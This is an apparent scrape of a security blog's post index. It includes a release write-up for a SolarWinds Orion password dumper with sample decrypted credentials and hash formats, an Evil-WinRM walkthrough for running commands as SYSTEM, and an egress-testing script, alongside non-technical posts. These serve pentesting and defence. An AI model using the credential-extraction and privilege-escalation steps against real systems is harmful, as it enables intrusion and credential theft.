","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:3:2","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"DAT file The DAT file is a recent (2019/2018?) additional encryption that was added to SolarWinds Orion. The file is also located in the ProgramData directory: %PROGRAMDATA%\\SolarWinds\\Keystorage\\CryptoHelper\\default.dat. This file is encrypted with the SYSTEM/LocalMachien DPAPI master keys. Once decrypted, much like the exporting of the RSA private key, it can be used to decrypt the AES based encrypted accounts in the database, offline. | Collecting Default.DAT file | Encrypted: 01000000D08C9DDF0115D\u003csnip\u003e | Decrypted: 5D3CE5B08C9201E636BCF\u003csnip\u003e ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:3:3","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"SWNetPerfMon.DB SolarWinds Orion stores it’s credentials for the database in a file called SWNetPerfMon.DB which can be found in the installation directory (usually Program Files). The scary piece of this file is that no matter how many software updates, or migrations of the data happen (from SQL server to SQL server), it stores all of the previous credentials, databases, and server names of the previous setups in this file. There is also a newer file called SolarWindsDatabaseAccessCredential.json that can be found in ProgramData again: %PROGRAMDATA%\\SolarWinds\\CredentialStorage\\SolarWindsDatabaseAccessCredential.json. This file is where the username and password are sometimes stored for the database. The credentials are encrypted with the SYSTEM/LocalMachine DPAPI master keys, this time with a static set of entropy: “20120309”. I have never been able to find the significance of this date in regards to SolarWinds. If anyone knows, please let me know, I’m super curious. ============================================ | Collecting Database Credentials | | Path to SWNetPerfMon.DB is: C:\\Program Files (x86)\\SolarWinds\\Orion\\SWNetPerfMon.DB | Connection String: Server=(local)\\SOLARWINDS_ORION;Database=SolarWindsOrion;User ID=SolarWindsOrionDatabaseUser;Password=SUPERSECRETPASSWORDHERE | Number of database credentials found: 1 ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:3:4","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"Connecting to the Database The code then attempts to automatically connect to the databases that it’s found and find the most current SolarWinds database. ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:3:5","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"Exporting the Key Table I currently haven’t put in enough time to identify what this table is used for, but it looks to me like it may be the private key for the RSA key, and the DAT file, encrypted in a different way. If this is the case, then you may not even need access to the SolarWinds Orion server itself, possibly you’d just need access to the database where SolarWinds stores it’s data. ============================================ | DB - Exporting Key Table | | KeyID: 1 | Encrypted Key: LmjknGhSXTC\u003csnip\u003e | Kind: Aes256 | Purpose: master | Protection Type: 1 | Protection Value: BE85C6C3AACA8\u003csnip\u003e | Protection Details: {} ------------------------------------------------ | KeyID: 2 | Encrypted Key: //pj6a4FaCyfv/Rgs\u003csnip\u003e | Kind: Aes256 | Purpose: oldcryptohelper | Protection Type: 0 | Protection Value: 1 | Protection Details: {\"IV\":\"oj3JCT7Cft\u003csnip\u003e\"} ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:3:6","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"Exporting the Accounts Table The accounts table is used to store credentials used to access the SolarWinds interface. It has changed a lot since my initial research. There used to be a column called “Password” that stored a credential that looked like this: 11-417578424799297-9-6260697430795685763067724. Many current installation still store this passwords in this manner, if it wasn’t a clean install. This is simple encoding with long division. If you are interested in the code you can see it here: https://github.com/mubix/solarflare/blob/b87da0b515d20964490dd922f3ef5bc17ed397f3/SolarFlare/Program.cs#L441 At the time of this writing there is a pull request to add the newer version of password hashing that SolarWinds uses to store credentials used to access SolarWinds. The major concern about SolarWinds Orion accounts is that it upper cases all account passwords. This means that the key space to attempt to crack them is 26 characters smaller (without the lowercase characters). This means that even though SolarWinds uses PBDKF12, 1000 iterations of it, and SHA512 hashing, cracking the account passwords is exponentially easier and faster. Admin and Guest are common across installs. The guest account used to be enabled by default, which would allow attackers to gain access to the interface. This is no longer the case. There are two new accounts _system which has it’s password stored in the credential database, and iprequest which I believe is a result of the one of the features I installed on the VM. The _system account is enabled by default and is an administrator. Even though this account has a randomized password, it being stored in the database means I can decrypt it, instead of trying to crack it. ============================================ | DB - Exporting Accounts Table | | Account: _system | Password Hash: qE9ClH\u003csnip\u003e | Password Salt: XgtO8XNWc/KiIdglGOnxvw== | Hashcat Mode 12501: $solarwinds$1$XgtO8XNWc/KiIdglGOnxvw==$qE9ClHDI\u003csnip\u003e | Account Enabled: Y | Allow Admin: Y | Last Login: 12/15/2020 -------------------------------------------- | Account: Admin | Password Hash: IfAEwA7LXxOAH7ORCG0ZYeq\u003csnip\u003e | Password Salt: jNhn3i2XtHfY8y4EOmNdiQ== | Hashcat Mode 12501: $solarwinds$1$jNhn3i2XtHfY8y4EOmNdiQ==$IfAEwA7LXxOAH7ORCG0ZY\u003csnip\u003e | Account Enabled: Y | Allow Admin: Y | Last Login: 12/02/2020 -------------------------------------------- | Account: Guest | Password Hash: Y/EMuOWMNfCd\u003csnip\u003e | Salt is NULL in DB so lowercase username is used: guest | Hashcat Mode 12500: $solarwinds$0$guest$Y/EMuOWMNfCd\u003csnip\u003e | Account Enabled: N | Allow Admin: N | Last Login: 12/30/1899 -------------------------------------------- | Account: iprequest | Password Hash: 7zskGWFukuHuwQ\u003csnip\u003e | Salt is NULL in DB so lowercase username is used: iprequest | Hashcat Mode 12500: $solarwinds$0$iprequest$7zskGWFukuHuwQ\u003csnip\u003e | Account Enabled: Y | Allow Admin: N | Last Login: 01/01/1900 -------------------------------------------- Here is what an older account type looks like: | Account: SITTINGDUCK\\uberolduser | Password: 11-417578424799297-9-6260697430795685763067724 | Decoded Password: ASDQWE123 | Hashcat Mode 21500: $solarwinds$0$admin$fF1lrlOXfxVz51Etjcs18XNK+Zt3keV2AllH9cYtGzdt5Yg2TtcsU84G9+5VVFMIUorR5eNJzX/1kmef6wZfrg== | Account Enabled: Y | Allow Admin: N | Last Login: 11/15/2015 | Account SID: S-1-5-21-1000000000-2000000000-3000000000-50000 | Group: SITTINGDUCK\\Domain Admins -------------------------------------------- ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:3:7","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"Exporting the Credentials Table Finally the actual credential table. I’ve observed 4 different methods for storing credentials here: Clear text (as is the case for SNMP community strings) Encrypted with the RSA key (this is the older method, being phased out it appears) Encrypted with AES using the default.dat file as the decryption key Encrypted using Microsoft’s XML encryption/decryption method. SolarFlare recognizes all of them, and will attempt to decrypt them accordingly. This is where you will find AWS API keys, vCenter credentials, SNMPv3 credentials, Cisco router and switch passwords and enable passwords. This is where the scary bits are. ============================================ | DB - Exporting Credentials Table | ------------------1-------------------------- | Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential | Name: _system | Desc: Cortex Integration | Owner: CORE | Password: 9dM-5pH/\u0026amp;Y(KU-v | Username: _system ------------------1-------------------------- ------------------2-------------------------- | Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential | Name: JobEngine | Desc: Job Engine router TCP endpoint credentials | Owner: JobEngine | Password: +fBByxJFsK+da6ZN2wKvLTKC/PWUzFlfIvvwtW/XqvA= | Username: KWPPhiYJmE8+fRF6qlkxulK2tf3t79TQOAk1ywBMVOI= ------------------2-------------------------- ------------------3-------------------------- | Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV2 | Name: public | Desc: | Owner: Orion | Community: public ------------------3-------------------------- ------------------4-------------------------- | Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV2 | Name: private | Desc: | Owner: Orion | Community: private ------------------4-------------------------- ------------------5-------------------------- | Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential | Name: Erlang cookie | Desc: Erlang clustering cookie | Owner: Erlang | Password: abcdefg12456789abcde | Username: ignored ------------------5-------------------------- ------------------6-------------------------- | Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential | Name: RabbitMQ user account | Desc: RabbitMQ user account for Message Bus | Owner: RabbitMQ | Password: LtVmCrzlTNyWmwxpxJMi | Username: orion ------------------6-------------------------- ------------------7-------------------------- | Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV3 | Name: User: snmpv3user, Context: thisisthecontext | Desc: | Owner: Orion | AuthenticationKeyIsPassword: false | AuthenticationPassword: ASDqwe123 | AuthenticationType: SHA1 | Context: thisisthecontext | PrivacyKeyIsPassword: false | PrivacyPassword: ASDqwe123 | PrivacyType: AES256 | UserName: snmpv3user ------------------7-------------------------- ------------------8-------------------------- | Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV3 | Name: User: rootsnmpv3, Context: newcontextv3 | Desc: | Owner: Orion | AuthenticationKeyIsPassword: true | AuthenticationPassword: ASDqwe123 | AuthenticationType: MD5 | Context: newcontextv3 | PrivacyKeyIsPassword: true | PrivacyPassword: ASDqwe123 | PrivacyType: AES128 | UserName: rootsnmpv3 ------------------8-------------------------- ------------------9-------------------------- | Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential | Name: DomainAdmin | Desc: | Owner: Orion | Password: ASDqwe123 | Username: SITTINGDUCK\\uberuser ------------------9-------------------------- ------------------10-------------------------- | Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential | Name: DomainJoiner | Desc: | Owner: Orion | Password: ASDqwe123 | Username: superadmin@sittingduck.info ------------------10-------------------------- ------------------11--------------------------","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:3:8","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"Last year I decided to give away 3 vouchers to PWK 60 days of labs. This was of my own free will and under no umbrella. I wanted to give back to the community and industry that provided a means to which I can feed, clothe, and put a roof over my family’s head. But, how to give away something like this? I didn’t want it to go to people who just were faster at coding than someone else, or could figure out some obscure CTF challenge. I wanted it to go to someone that was hungry to learn and hungry to achieve more, so I devised a 3 stage challenge. Here is the original post about it: https://gist.github.com/mubix/f14e3681df6aedd08394b71cfec6e49e ","date":"2020-11-26","objectID":"https://malicious.link/posts/2020/2020-oscp-contest/:0:0","tags":["oscp","voucher","contest"],"title":"2020 OSCP Contest","uri":"https://malicious.link/posts/2020/2020-oscp-contest/"},{"categories":null,"content":"Challenge 1: Get two people to send us a letter of recommendation. This didn’t have to be formal and could very easily just be a direct message from them. We used this challenge to get a sense for your effect on others. Someone who does good for others has no trouble finding people who will speak well of them. This was also a test to see if you had the perseverance to ensure both people contacted us. ","date":"2020-11-26","objectID":"https://malicious.link/posts/2020/2020-oscp-contest/:1:0","tags":["oscp","voucher","contest"],"title":"2020 OSCP Contest","uri":"https://malicious.link/posts/2020/2020-oscp-contest/"},{"categories":null,"content":"Challenge 2: Send us information about a topic in Infosec you are passionate about and write a little bit about it. This could just be the word “Forensics”, but the caveat is that you needed to convince us of why you are interested in that topic and show passion for it. No limit or requirement of length, but one word answers will probably not make it to the next round. ","date":"2020-11-26","objectID":"https://malicious.link/posts/2020/2020-oscp-contest/:2:0","tags":["oscp","voucher","contest"],"title":"2020 OSCP Contest","uri":"https://malicious.link/posts/2020/2020-oscp-contest/"},{"categories":null,"content":"Challenge 3: The final challenge would be based on your answer to challenge 2. We asked participants to write up a topic pertaining to their passion or selected interest. This will need to be at least a couple paragraphs. Thats it. If you made it through to the final challenge by showing enough effort, We put in the effort to read every entry and selected the ‘best’ top 3 based on the participants: Respect (of time, mine, theirs, and others) Perseverance Humility (not self-deprecation) Resourcefulness (specifically in challenge 3, to learn something new) This year. We are doing it again. This time, I have more help. Along with SpikyGeek, the amazing Int0x80 from @dualcoremusic will be joining me on helping to judge the contest, and this year, there are FIVE (5) vouchers graciously donated from the Offensive Security team. So there will be a TOP 5. Rules ALL submissions must be done via direct message to the OSCPGiveaway twitter account. This means that if you want to submit a PDF or doc or whatever, you need to post a link to a Google Drive file or some other means. Emails regarding the contest to any of the contest committee will be ignored. All announcements will go through the twitter account as well, so you should turn on notifications for that account if you want to keep up to date with things. If you have more than 2 letters of recommendation sent to us, we will assume you don’t respect my time and disqualify you due to the tenets of the contest. We do not have all the time in the world and there are only three of us looking through every person’s submissions in this contest. We don’t have infinite time to do so. If you cannot seem to follow the directions as they are laid out in the above document, you will be disqualified. Read carefully. In your first DM to the twitter account include your favorite emojii by itself just to show that you actually read these rules. This will be how you enter the contest. Random mentions sent to us or the team on Twitter are not Direct Messages, people vouching for you, or endorsements this way will be ignored and not count towards your contest submissions. ","date":"2020-11-26","objectID":"https://malicious.link/posts/2020/2020-oscp-contest/:3:0","tags":["oscp","voucher","contest"],"title":"2020 OSCP Contest","uri":"https://malicious.link/posts/2020/2020-oscp-contest/"},{"categories":null,"content":"Addendums and Clarifications Challenge 3 is supposed to be a question/topic that we (the organizers) chose based on the topic you submitted for Challenge 2. Apologies for the confusion here. It will be worded better next year. You do not have to wait for any acknowledgment to submit Challenge 1 and Challenge 2. Deadlines ","date":"2020-11-26","objectID":"https://malicious.link/posts/2020/2020-oscp-contest/:4:0","tags":["oscp","voucher","contest"],"title":"2020 OSCP Contest","uri":"https://malicious.link/posts/2020/2020-oscp-contest/"},{"categories":null,"content":"Challenge 1: December 5th ","date":"2020-11-26","objectID":"https://malicious.link/posts/2020/2020-oscp-contest/:5:0","tags":["oscp","voucher","contest"],"title":"2020 OSCP Contest","uri":"https://malicious.link/posts/2020/2020-oscp-contest/"},{"categories":null,"content":"Challenge 2: December 10th ","date":"2020-11-26","objectID":"https://malicious.link/posts/2020/2020-oscp-contest/:6:0","tags":["oscp","voucher","contest"],"title":"2020 OSCP Contest","uri":"https://malicious.link/posts/2020/2020-oscp-contest/"},{"categories":null,"content":"Challenge 3: December 26th ","date":"2020-11-26","objectID":"https://malicious.link/posts/2020/2020-oscp-contest/:7:0","tags":["oscp","voucher","contest"],"title":"2020 OSCP Contest","uri":"https://malicious.link/posts/2020/2020-oscp-contest/"},{"categories":null,"content":"Winners Announced on January 2nd 2021 ","date":"2020-11-26","objectID":"https://malicious.link/posts/2020/2020-oscp-contest/:8:0","tags":["oscp","voucher","contest"],"title":"2020 OSCP Contest","uri":"https://malicious.link/posts/2020/2020-oscp-contest/"},{"categories":null,"content":"I love this so much I wanted to keep it around. I googled to see if this was posted somewhere in text form but I couldn’t find it. Traditionally I haven’t been a fan of daily mantras, but I’m thinking about talking to my kids about repeating this one. From @emmalinecs on Tiktok: https://www.tiktok.com/@emmalinecs/video/6866994894930562310 For those who don’t want to click on a Tiktok link or use the service I’ll set the scene a bit. This mom, Emma, repeats the following with her kids on the video. I’m not sure if this is a daily thing or not, but I will imagine it as so. Much of change is incremental generational movements. You don’t move a mountain using one big heave, you do so by relentlessly changing it bit by bit. Persistence is power. If you look or sound different, trans or gay, I love and respect you every single day. I speak up for what’s right and help those when they need. I follow my instincts, they’re the path that I lead. I nurture my soul, my body, my mind. I don’t need to be perfect, to myself I’ll be kind. If I need help, I will ask, that’s the brave thing to do. And if I do something wrong, I’ll say sorry to you. I’ll forever work hard, explore, learn and play. I don’t need to have it all sorted, but I’ll do these each day: Loving thoughts, loving words, loving heart on this day, I am safe, I am loved, life is great… Hip hip! Oh yay! ","date":"2020-09-30","objectID":"https://malicious.link/posts/2020/family-mission-statement/:0:0","tags":["noninfosec"],"title":"Family Mission Statement","uri":"https://malicious.link/posts/2020/family-mission-statement/"},{"categories":null,"content":"This is a quick blog post on how to elevate to SYSTEM without the need for PSEXEC when you are using PowerShell, or more specifcially in this case, PowerShell Remoting (WinRM). First off, let me introduce my tool of choice here. It’s Evil-WinRM. I spoke about it in the Practical Exploitation video here: https://www.youtube.com/watch?v=tVgJ-9FJKxE, so I won’t go too far indepth. It’s essentially the only WinRM tool that I’ve found to work well in a non-Windows native situation (also you can proxy it through proxychains which is AWESOME!!). Anyways. I want to document how to run commands as SYSTEM without the use of PSEXEC. I found this technique on a 4sysops blog post called Running PowerShell Remotely As System with Invoke-CommandAs. Side-note you should definitely bookmark thier blog it’s great. Invoke-CommandAs is not a native function of PowerShell, so you need to download it from the original author’s Github repo: https://github.com/mkellerman/Invoke-CommandAs For our uses all you need to do is get these two particular files: https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1 https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1 Here you can see me putting those two files into a scripts directory I made inside of the Evil-WinRM folder. (git clone https://github.com/Hackplayers/evil-winrm + bundle install) root@attacker:~/evil-winrm/scripts# ls Invoke-CommandAs.ps1 root@attacker:~/evil-winrm/scripts# wget https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs/Private/Invoke- --2020-09-13 20:17:56-- https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.200.133 Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.200.133|:443... connected. HTTP request sent, awaiting response... 200 OK Length: 10009 (9.8K) [text/plain] Saving to: 'Invoke-ScheduledTask.ps1' Invoke-ScheduledTask.ps1 100%[=========================================================================================== 2020-09-13 20:17:56 (5.37 MB/s) - 'Invoke-ScheduledTask.ps1' saved [10009/10009] Once that’s ready, I run Evil-WinRM with the -s flag and specify the scripts directory I put the two files in. root@attacker:~/evil-winrm# ruby evil-winrm.rb -i 192.168.80.10 -u uberuser -s scripts/ Enter Password: Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\uberuser\\Documents\u003e Once I have the shell I load each of the scripts by typing out their file names (tab complete should work) *Evil-WinRM* PS C:\\Users\\uberuser\\Documents\u003e Invoke-ScheduledTask.ps1 *Evil-WinRM* PS C:\\Users\\uberuser\\Documents\u003e Invoke-CommandAs.ps1 Once they are loaded you need to run the menu command to load the functions into memory on the attackers side. I haven’t looked at the code enough to know exactly why this is needed, but it doesn’t seem to work if you don’t. *Evil-WinRM* PS C:\\Users\\uberuser\\Documents\u003e menu ,. ( . ) \" ,. ( . ) . (\" ( ) )' ,' (` '` (\" ) )' ,' . ,) .; ) ' (( (\" ) ;(, . ;) \" )\" .; ) ' (( (\" ) );(, )(( _\".,_,.__).,) (.._( ._), ) , (._..( '.._\"._, . '._)_(..,_(_\".) _( _') \\_ _____/__ _|__| | (( ( / \\ / \\__| ____\\______ \\ / \\ | __)_\\ \\/ / | | ;_)_') \\ \\/\\/ / |/ \\| _/ / \\ / \\ | \\\\ /| | |__ /_____/ \\ /| | | \\ | \\/ Y \\ /_______ / \\_/ |__|____/ \\__/\\ / |__|___| /____|_ /\\____|__ / \\/ \\/ \\/ \\/ \\/ By: CyberVaca, OscarAkaElvis, Laox @Hackplayers [+] Bypass-4MSI [+] Dll-Loader [+] Donut-Loader [+] Invoke-Binary [+] Invoke-CommandAs [+] Invoke-ScheduledTask As we can see both of the needed functions are loaded and we can finally issue our commands as SYSTEM with the -AsSystem flag and the command being whoami: *Evil-WinRM* PS C:\\Users\\uberuser\\Documents\u003e Invoke-CommandAs -ScriptBlock {whoami} -AsSystem nt authority\\system *Evil-WinRM* PS C:\\Users\\u","date":"2020-09-13","objectID":"https://malicious.link/posts/2020/run-as-system-using-evil-winrm/:0:0","tags":["winrm","system","psexec"],"title":"Run as SYSTEM using Evil-WinRM","uri":"https://malicious.link/posts/2020/run-as-system-using-evil-winrm/"},{"categories":null,"content":"For brevity, I will be using the term “partner” to refer to the customer, Defensive Team, IT Team, or other direct consumers of the Offensive Team’s output. In my experience, offensive security teams, be them internal or external (consultants/contractors), the relationship they have with companies falls into one of four phases: The “Adversarial” phase The “Hammer” phase The “Friendship” phase The “Adversarial Friendship” phase ","date":"2020-07-05","objectID":"https://malicious.link/posts/2020/four-phases-of-offsec/:0:0","tags":["redteam","pentest","rant","offsec"],"title":"The Four Phases of Offensive Security Teams","uri":"https://malicious.link/posts/2020/four-phases-of-offsec/"},{"categories":null,"content":"Adversarial The first phase is that of adversaries. Neither party wants to be doing what they are doing. The partner doesn’t see value in the Offensive Team and only sees it as a waste of time, extra work, a checkbox to become compliant, or orders from “on high.” Either way, neither team wants to be doing what they are doing. How do you make the most of this phase or move out of it? The Offensive Team has to do the heavy lifting here. The partner is in this state, either from a negative experience, or lack of experience, so it is on the Offensive Team to over-communicate goals and objectives and be flexible to adjust to benefit the direct partner as much as possible. The Offensive Team should suggest modifying the engagement to limit extra work from the partner, even if it limits the scope of the engagement. Being over accommodating can help create a positive experience for the partner and move future engagements with this partner out of this phase, even if it doesn’t directly affect the one at hand. ","date":"2020-07-05","objectID":"https://malicious.link/posts/2020/four-phases-of-offsec/:1:0","tags":["redteam","pentest","rant","offsec"],"title":"The Four Phases of Offensive Security Teams","uri":"https://malicious.link/posts/2020/four-phases-of-offsec/"},{"categories":null,"content":"Hammer The “Hammer” phase is where the intent of engagement is for the Offensive Team’s output to be used as a hammer. This phase is also the most common in my experience as it is mainly used for internal politics, to prove points or cause actions. For example, if a development team refuses to patch a particular vulnerability due to projected outages, a partner might pull in an Offensive Team to demonstrate the risk of not patching it. Offensive Teams do not always know they are being used as a hammer. The unfortunate result of this phase is that many times the Offensive Team has unintentionally created a negative experience for the team being attacked and used as an example. Using the Offensive Team in this way can create problems in future engagements and make sure they land squarely in the Adversarial phase. There are positives to this phase. The hammer phase can help to overcome prejudices and biases and open eyes to possibilities. However, it is a fine line between “name and shame” and eye-opening, a line that the Offensive Team has very little control over. Internal Offensive Teams need to take extra care to not “name and shame” any part of the company as it will spread like wildfire that that is the intent of the team and is very hard to recover from. How do you know your Offensive Team team is being used as a hammer? Over-communication again. Setting expectations correctly about what the output should be and the goals of the engagement are. It should become evident that the more you talk to the partner about goals, whether you are being used in proving a point or if you are in one of the other phases. ","date":"2020-07-05","objectID":"https://malicious.link/posts/2020/four-phases-of-offsec/:2:0","tags":["redteam","pentest","rant","offsec"],"title":"The Four Phases of Offensive Security Teams","uri":"https://malicious.link/posts/2020/four-phases-of-offsec/"},{"categories":null,"content":"Friendship The friendship phase is when the partner and the Offensive Team have become friends (at least in a professional manner) and know each other’s teams’ goals. They have realized that they’re both needed in the organization, and genuinely want to help either other achieve their goals. The good part of this phase is that you get more done as an Offensive Team. There is less friction to performing engagements and providing your results. The bad part is that it’s unfortunately easy to slip back into one of the previous phases via employee turn over or one poorly worded report. Friendships require cultivation, and staying in this phase needs regular conversations with the teams and partners involved. ","date":"2020-07-05","objectID":"https://malicious.link/posts/2020/four-phases-of-offsec/:3:0","tags":["redteam","pentest","rant","offsec"],"title":"The Four Phases of Offensive Security Teams","uri":"https://malicious.link/posts/2020/four-phases-of-offsec/"},{"categories":null,"content":"Adversarial Friendship The final phase is the adversarial friendship. This phase is when software vulnerabilities no longer hold political weight at the company, and the security goal has shifted to prevention, response, and detection. The partner and the Offensive Teams work hand in hand, many times as a “Purple Team” or Red vs. Blue, to achieve efficiency goals, such as quicker time-to-detection or time-to-eradication. This phase is the optimal situation and rarely achieved. Many companies I have worked for/with have attempted to jump to this phase without the friendship portion required to make it work. However, when it does, both the partner and the Offensive Team are pushed to improve and excel beyond their previous capabilities, and pure magic can happen. I have only been in the Adversarial Friendship Phase three times in my career, and I can say that it was unfortunately short-lived. It takes the two teams actually having pure fun together to make it work. ","date":"2020-07-05","objectID":"https://malicious.link/posts/2020/four-phases-of-offsec/:4:0","tags":["redteam","pentest","rant","offsec"],"title":"The Four Phases of Offensive Security Teams","uri":"https://malicious.link/posts/2020/four-phases-of-offsec/"},{"categories":null,"content":"Conclusion Notice that through this entire rant, I didn’t mention leadership, management, or executives. It is effortless to blame “them” for Offensive Teams not being accepted or forced into one phase or another. Still, it’s on the teams to define that narrative better through expectation setting and over communication. ","date":"2020-07-05","objectID":"https://malicious.link/posts/2020/four-phases-of-offsec/:5:0","tags":["redteam","pentest","rant","offsec"],"title":"The Four Phases of Offensive Security Teams","uri":"https://malicious.link/posts/2020/four-phases-of-offsec/"},{"categories":null,"content":"Use-cases: IT Admin, Firewall Admin, or Security staff at a company and want to confirm what ports and protocols are allowed of your network. Pentester that intends to identify ports and protocols that can be used for a pentest to gain C2 outbound. Purple Team testing ports and protocol detection for C2. Egress testing is an exciting problem due to the uniqueness of most networks. You may find fully open networks like those found in many Silicon Valley companies or companies attempting to move to a “Beyond Corp” model. Or, you may find a network of a small business that hasn’t put much thought into outbound egress but follow traditional best practices allowing only specific ports out. You may be up against an enterprise that only allows proxied connections outbound with full protocol filtering and analysis. I created LetMeOutOfYour.net to handle all of these situations. I wanted a service that allows for confirmable responses via as many protocols as possible over any port. The design idea is that the server listens on all ports multiplexed for the most common three protocols (HTTP, HTTPS, and SSH). DNS is setup up in a way that all hostnames and sub-domains also route to the LMO host. On SSH, the server host key is used to confirm successful, non-modified connections. HTTP is set up to listen not only on any port but also any URI. HTTPS has a valid SSL certificate, thanks to LetsEncrypt. For example: https://randomstring2321.letmeoutofyour.net:3821/return/to/path.wsdl Response: (w00tw00t) http://test.woot.letmeoutofyour.net:22/cool/stuff.php Response: (w00tw00t) The following is a script to test a range of ports with HTTP, HTTPS, and SSH and confirm the response\" Just beginning with libraries. Paramiko is a SSH library for Python, and Concurrent.Futures is a method for creating concurrency/threading to speed up the script. #!/usr/bin/env python3 import requests import socket import random import string import concurrent.futures from paramiko.client import SSHClient import paramiko Here are the variable to configure the script: Ports: Two examples for specifying a list of ports, or doing a range is available. Domain: Anyone can set up their own LMO server using this Ansible script: LetMeOutOfYour.net Server Setup. Verbose: Adds output saying what is being tested at that time. printOpen and printClosed: These options can help determine how much output you want. If you are in a network that has mostly open connections you may only want things that are closed, or if you are egress testing a more closed network you may only want open. Or you may want everything and just filter it later. ThreadCount: How many threads to spin up to get through your list. Finally it randomizes the list so that you aren’t hitting everything in order. # VARIABLES ports = [80,443,445,8080,3389,22,21] #ports = list(range(1,65536)) domain = \"letmeoutofyour.net\" verbose = False printOpen = True printClosed = True threadcount = 100 random.shuffle(ports) These functions are just checking if the different verbosity levels are set and printing if they are. # Verbosity - set to False above if you don't want output def vprint(status): if verbose == True: print(status) # Print open ports def print_open(status): if printOpen == True: print(\"[+] \" + status) # Print closed ports def print_closed(status): if printClosed == True: print(\"[-] \" + status) This is the function to test the HTTP/HTTPS connections: def check_web(base, domain, port): vprint(\"Testing: \" + base + domain + \":\" + str(port)) try: r = requests.get(base + domain + \":\" + str(port), timeout=1) result = r.text.strip() if result == \"w00tw00t\": print_open(\"Success! \" + base + domain + \":\" + str(port)) except requests.exceptions.ConnectionError: print_closed(\"Failed! \" + base + domain + \":\" + str(port)) This is the function to test SSH. It actually is pretty interesting because using Paramiko there isn’t a direct way just ask for remote host key that I’ve found, but you can attempt to connect, catch that ","date":"2020-07-04","objectID":"https://malicious.link/posts/2020/lmo-egress-testing/:0:0","tags":["mubix","lmo","lmooydn","egress","firewall"],"title":"Let Me Out of Your Net - Egress Testing","uri":"https://malicious.link/posts/2020/lmo-egress-testing/"},{"categories":null,"content":"One of the hard things about this pandemic is many people are either losing their jobs or having a hard time finding a new one in general. It was suggested that I make one of these during this time. So, here it is. ","date":"2020-03-27","objectID":"https://malicious.link/posts/2020/2020-pandemic-hiring-list/:0:0","tags":["pandemic","shelter-in-place","hiring"],"title":"2020 Pandemic SIP Hiring List","uri":"https://malicious.link/posts/2020/2020-pandemic-hiring-list/"},{"categories":null,"content":"ONLY POST IF YOU CAN REMOTE INTERVIEW AND REMOTE HIRE FOR REMOTE WORK The 2020 Unofficial Pandemic Shelter-In-Place Hiring List. To get on the list is just complete the following form: https://forms.gle/kXWTKBEE4s6h9aPT7 (One small tip, first come first serve, so if you want to be on the top of the list it’s best to submit the best info you have vs waiting on anyone, I don’t change the list order for anyone.) Direct Link to the Hiring List Google Doc: https://docs.google.com/spreadsheets/d/1g66yBwTDsqoPQbkak7yHRJ4HzX3-AxnVAOnBCcshb0c/ ","date":"2020-03-27","objectID":"https://malicious.link/posts/2020/2020-pandemic-hiring-list/:0:1","tags":["pandemic","shelter-in-place","hiring"],"title":"2020 Pandemic SIP Hiring List","uri":"https://malicious.link/posts/2020/2020-pandemic-hiring-list/"},{"categories":null,"content":"This is just a quick script to demonstrate using PowerShell to run all the rules against a specific hash (or hash file), starting from the smallest file (usually the simplest rules) Set-Location -Path 'C:\\Program Files\\hashcat\\' Get-ChildItem .\\rules\\ | where { $_.extension -eq \".rule\" } | Sort-Object 